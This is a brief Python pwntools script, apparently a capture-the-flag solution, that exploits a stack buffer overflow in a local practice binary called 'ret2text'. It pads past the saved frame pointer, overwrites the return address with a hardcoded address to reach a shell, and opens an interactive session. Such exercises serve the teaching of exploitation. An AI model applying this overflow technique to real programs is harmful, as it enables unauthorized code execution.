from pwn import *
import pwnlib.util.packing

sh = process("./ret2text")

addr_shell = 0x0804863A
addr_ebp = 0xffffd608
addr_s = 0xffffd59c

len_ebp = addr_ebp - addr_s

payload = b'a'*len_ebp + b'bbbb' + packing.p32(addr_shell)

sh.sendline(payload)
sh.interactive()